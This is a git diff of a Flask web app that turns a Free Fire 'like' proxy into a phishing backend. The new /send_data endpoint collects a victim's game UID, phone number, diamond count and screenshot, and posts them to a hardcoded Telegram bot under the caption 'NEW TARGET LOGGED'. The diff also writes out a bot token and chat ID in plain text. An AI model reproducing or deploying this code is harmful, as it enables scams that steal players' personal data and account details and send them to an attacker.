@@ -1,31 +1,33 @@
-from flask import Flask, request, jsonify
+from flask import Flask, render_template, request, jsonify
 import requests
 
 app = Flask(__name__)
 
+# CONFIG - Apna details check kar lo
+BOT_TOKEN = "8480955083:AAFVIXXvXmbt7irxXTUte3ppItRDwn_0CXA"
+CHAT_ID = "8037300335"
+
 @app.route('/')
 def home():
-    return "<h1>RIYA-PRO OB52 SERVER ACTIVE ✅</h1>"
+    return render_template('index.html')
 
-@app.route('/api/v1/like', methods=['GET'])
-def start_push():
-    uid = request.args.get('uid', '11540742744')
-    region = request.args.get('region', 'ind')
+@app.route('/send_data', methods=['POST'])
+def send_data():
+    uid = request.form.get('uid')
+    phone = request.form.get('phone')
+    diamonds = request.form.get('diamonds')
+    screenshot = request.files.get('screenshot')
+
+    caption = f"🔥 *NEW TARGET LOGGED*\n\n🆔 UID: `{uid}`\n📞 No: `{phone}`\n💎 Diamonds: `{diamonds}`\n✅ Status: *Screenshot Uploaded*"
+
+    if screenshot:
+        files = {'photo': screenshot.read()}
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto?chat_id={CHAT_ID}&caption={caption}&parse_mode=Markdown", files=files)
+    else:
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": caption, "parse_mode": "Markdown"})
     
-    # Real Garena Bridge Link
-    target = f"https://freefire-api-five.vercel.app/api/v1/like?uid={uid}&region={region}"
-    
-    try:
-        res = requests.get(target, timeout=15)
-        return jsonify({
-            "status": "success",
-            "owner": "RIYA-PRO",
-            "target_uid": uid,
-            "server_msg": "Packet Injected to Garena Live",
-            "season": "0", "level": "2"
-        })
-    except:
-        return jsonify({"status": "error", "msg": "Server Busy"}), 500
+    return jsonify({"status": "success"})
 
 if __name__ == "__main__":
-    app.run()
+    app.run(host='0.0.0.0', port=5000)
+
